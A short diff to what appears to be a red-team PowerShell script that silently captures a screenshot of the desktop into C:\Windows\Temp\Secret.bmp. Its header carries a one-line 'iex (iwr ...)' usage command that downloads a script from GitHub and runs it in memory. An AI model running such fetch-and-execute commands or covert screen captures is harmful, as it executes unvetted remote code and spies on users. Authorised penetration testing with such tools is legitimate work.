@@ -1,6 +1,7 @@
 #############################################################################
 # Capturing a screenshot
 # iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy.ps1);
+# Default Path/fileName: C:\Windows\Temp\Secret.bmp
 #############################################################################
 $File = "C:\Windows\Temp\Secret.bmp"
 Add-Type -AssemblyName System.Windows.Forms
